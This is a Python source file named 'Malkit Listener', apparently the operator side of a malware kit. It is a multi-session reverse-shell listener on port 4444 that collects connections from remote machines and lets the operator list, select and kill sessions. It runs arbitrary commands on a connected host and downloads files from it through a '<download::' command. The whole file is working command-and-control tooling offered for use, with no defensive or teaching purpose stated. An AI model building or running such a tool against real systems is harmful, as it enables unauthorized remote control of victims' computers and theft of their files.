import os
import socket
import sys
import time
from _pline import console
from threading import Thread
from progress.spinner import Spinner


sessions = []
alive = True
mainalive = 0
port = 0
block = False
# Disable print
def blockPrint():
    sys.stdout = open(os.devnull, 'w')

# Restore print
def enablePrint():
    sys.stdout = sys.__stdout__

def transfer(conn, command):
    try:
        conn.send(command.encode())
        grab, src, dst = command.split("::")
        dst_directory = '/'.join(dst.replace("\\", "/").split("/")[:-1])
        print(dst_directory)
        if not dst_directory.endswith("/"):
            dst_directory += "/"
        if not os.path.exists(dst_directory):
            os.makedirs(dst_directory)
        bits = b""
        while True:
            print("Transferring file...", end="\r")
            bits += conn.recv(1024)
            if bits.startswith(b"File not found"):
                print('[-] Unable to find out the file')
                break
            elif bits.endswith(b"DONE"):
                bits = bits[:-4]
                break
        with open(dst, "wb") as f:
            f.write(bits)
            print(f"File written Successfully at: {dst}")
            return 0
    except Exception as e:
        print(f"Unknown Exception: {e}")
        return 1


def clear():
    if sys.platform != "linux":
        os.system("cls")
    else:
        os.system("clear")

def die():
    block = True
    global alive
    alive = False
    print("\n[+] Cleaning up...")
    time.sleep(3)
    clear()
    spinner = Spinner("Exiting...")
    for _ in range(20):
        spinner.next()
        time.sleep(0.1)
    spinner.finish()
    clear()
    print("[+] Done")
    time.sleep(1)
    clear()
    os._exit(1)


def run_server():
    global port
    global mainalive
    
    host = "0.0.0.0"
    port = 4444
    s = socket.socket()
    tries = 60
    if block:
        blockPrint()
    elif not block:
        enablePrint()
    for conTry in range(tries):
        try:
            s.bind((host, port))
            print(
                f'\n[+] Listening for income TCP connection on port {port}...\n')
            break
        except OSError:
            print(
                f"oops, problem with socket. Retrying... [{conTry}/{tries-conTry}s]", end="\r")
            time.sleep(1)
            continue
        print("Couldn't fix socket problem. Try again.")
        die()
    s.listen(10)
    mainalive += 1
    while alive:
        if block:
            blockPrint()
        elif not block:
            enablePrint()
        try:
            client, addr = s.accept()
            num = len(sessions)
            session = [num, client, addr, 0]
            sessions.append(session)
        except Exception as err:
            print(err)
    s.close()
    return 0

def help():
    help_screen = """
Malkit Listener Help Screen!

The commands are split into two categories:
    [Listener commands]: the ones you can use inside the "Listener>" screen.

    [Shell commands]: the ones you can use inside the "Shell>" screen after interacting with a session.


[Listener Commands]

list    -   lists all active sessions in the format: SessionNumber: IP/PORT
interact::SessionNumber    -   Allows you to interact with a session number. Example: interact::0
kill::SessionNumber    -   Kills a specific session number. Example: kill::0
exit    -   Exits the listener, same effect as a KeyboardInterrupt
help    -   Shows this screen 



[Shell Commands]

<bg or <background  -   Backgrounds the current session, allowing you to return to the lister.
<download::RemotePath::LocalPath    -   Downloads a file from the remote system into your local one.
                                        Example: <download::remote_file.txt::savehere/files/downloaded.txt 
exit or <exit   -   Kills the current shell, returning you into the listener

"""
    print(help_screen)
    return 0

commands_listener = ["help ", "kill ", "list ", "interact::", "exit "]
commands_shell = ["<bg ", "<background ", "<download::", "<exit", "exit"]

def completer_listener(text):
    return [i for i in commands_listener if (i.startswith(text) and len(text)>0)]
def completer_shell(text):
    return [i for i in commands_shell if (i.startswith(text) and len(text)>0)]

def handle_client():
    # Key Codes 
    BACKSPACE = 8
    lCONTROL_L = (76, 40)
    rCONTROL_L = (76, 36)
    ENTER = 13
    TAB = 9
    TAB_state = (9, 32)

    global sessions
    global holder
    global mainalive
    mainalive += 1
    #readline.parse_and_bind("tab: complete")
    
    #
    c = console.Console(0)
    sys.stdout = c
    sys.stderr = c
    time.sleep(2)
    while alive:
        flush = False
        try:
            c.write(f"Listener> ")
            buffer = ""
            while True:
                try:
                    ch = c.getkeypress()
                    if ch.keycode == BACKSPACE:
                        if len(buffer) >= 1:
                            c.write('\b \b')
                            buffer = buffer[:-1]
                    elif (ch.keycode, ch.state) == lCONTROL_L or (ch.keycode, ch.state) == rCONTROL_L:
                        clear()
                        flush = True
                        break
                    elif (ch.keycode, ch.state) == TAB_state:
                        options = completer_listener(buffer)
                        if len(options) == 0: continue
                        elif len(options) == 1:
                            completed = options[0]
                            start_point = len(buffer)
                            diff = completed[start_point:]
                            c.write(diff)
                            buffer += diff
                        elif len(options) > 1 and len(options) <= 10:
                            c.write("\n")
                            for option in options:
                                c.write(option + "    ")
                            c.write("\n" + "Listener> " + buffer)
                    elif ch.keycode == ENTER:
                        c.pos(y=0)
                        c.write("\n")
                        break
                    else:
                        c.write(ch.char)
                        buffer += ch.char
                except Exception as err:
                    pass
            if flush: continue        
            com, *arg = buffer.split(" ")
            com = com.lower()
            arg = ''.join(arg).lower()
            if com == "cls" or com == "clear" or com.encode() == b'\x0c':
                clear()
            elif com.lower() == "help":
                help()
                continue
            elif com == "exit":
                die()
            elif com == "list":
                if len(sessions) == 0:
                    print("No sessions at the moment")
                    continue
                print(f"\nNumber of sessions: {len(sessions)}\n")
                for x in sessions:
                    print(f"{x[0]}: {x[2][0]} / {x[2][1]} (remote: {port}")
                print("\n\n")
            elif com == "kill":
                try:
                    int_arg = int(arg)
                    sessions.pop(int_arg)
                    holder -=1
                except Exception as e:
                    print("error", e)
            elif com.startswith("interact"):
                try:
                    comm, snum = com.split("::")
                    conn = sessions[int(snum)][1]
                except:
                    print("make sure you did it right")
                    continue
                while alive:
                    flush = False
                    c.write(f"[{snum}] Shell>")
                    buffer2 = ""
                    while True:
                        try:
                            ch = c.getkeypress()
                            if ch.keycode == BACKSPACE:
                                if len(buffer2) >= 1:
                                    c.write('\b \b')
                                    buffer2 = buffer2[:-1]
                            elif (ch.keycode, ch.state) == lCONTROL_L or (ch.keycode, ch.state) == rCONTROL_L:
                                clear()
                                flush = True
                                break
                            elif (ch.keycode, ch.state) == TAB_state:
                                options = completer_shell(buffer2)
                                if len(options) == 0: continue
                                elif len(options) == 1:
                                    completed = options[0]
                                    start_point = len(buffer2)
                                    diff = completed[start_point:]
                                    c.write(diff)
                                    buffer2 += diff
                                elif len(options) > 1 and len(options) <= 10:
                                    c.write("\n")
                                    for option in options:
                                        c.write(option + "    ")
                                    c.write("\n" + f"[{snum}] Shell> " + buffer2)
                            elif ch.keycode == ENTER:
                                c.pos(y=0)
                                c.write("\n")
                                break
                            else:
                                c.write(ch.char)
                                buffer2 += ch.char
                        except Exception as err:
                            pass
                    if flush: continue
                    command = buffer2
                    try:
                        if command == "exit" or command == "<exit":
                            sessions.pop(int(snum))
                            break
                        elif command == 'cls' or command == 'clear' or command.encode() == b'\x0c':
                            clear()
                            continue
                        elif command == "<bg" or command == "<background":
                            print(f"Backgrounded: {snum}")
                            break
                        elif command.startswith('<download'):
                            try:
                                grab, src, dst = command.split("::")
                                transfer(conn, command)
                            except Exception as e:
                                print(
                                    "Hey, use proper syntax. Example: <download::remotefile::localdestination/localfile.txt")
                            continue

                        elif command.strip() == "":
                            continue
                        elif command.startswith("cd "):
                            conn.send(command.encode())
                            output = b""
                            while True:
                                output += conn.recv(1024)
                                if output.endswith(b"CDDONE"):
                                    print(output.decode().replace("CDDONE", ""))
                                    break
                            continue
                        elif command.lower() == "help":
                            help()
                            continue
                        else:
                            conn.send(command.encode())
                            output = b""
                            while True:
                                output += conn.recv(1024)
                                if output.endswith(b"CMDDONE"):
                                    print(output.decode().replace(
                                        "CMDDONE", ""))
                                    break
                    except WindowsError:
                        break
                    except (KeyboardInterrupt, EOFError):
                        print("")
                        continue
                    except Exception as err:
                        print(f"Shell Error: [{err}]")
                        continue
        except (KeyboardInterrupt, EOFError):
            break
    return 0

## Need to add detection of timed out connection!

#def timeout():
#    global sessions
#    while alive:
#        time.sleep(10)
#        com = "pwd"
#
#        for x in sessions:
#            try:
#                conn = x[1]
#                conn.send(com.encode())
#                resp = conn.recv(1024).decode()
#                if len(resp) > 0:
#                    continue
#                else:
#                    sessions.pop(x[0])
#            except Exception as e:
#                print(e)
                #sessions.pop(x[0])

holder = 0
def print_conn():
    global alive
    global sessions
    global holder
    global mainalive
    mainalive += 1
    while alive:
        if block:
            blockPrint()
        elif not block:
            enablePrint()
        time.sleep(2)
        if len(sessions) > holder:
            diff = len(sessions) - holder
            for x in range(holder, holder + diff):
                print(f'\n[+] Got one! Session {sessions[x][0]} from {sessions[x][2][0]} on port {sessions[x][2][1]} (remote: {port})...\n')
            holder = len(sessions)
    return 0

def run_alive(queue: list):
    for thread in queue:
        thread.setDaemon(True)
        thread.daemon = True
        thread.start()

queue = []
if __name__ == "__main__":
    try:
        run_server_thread = Thread(target=run_server)
        print_conn_thread = Thread(target=print_conn)
        # control_timeout = Thread(target=timeout)
        main_server_thread = Thread(target=handle_client)
        #screen_control_thread = Thread(target=screen_control)

        queue.append(run_server_thread)
        queue.append(print_conn_thread)
        #queue.append(screen_control_thread)
        # queue.append(control_timeout)
        queue.append(main_server_thread)

        run_alive(queue)

        while True:
            time.sleep(1000)

    except (KeyboardInterrupt, SystemExit):
        die()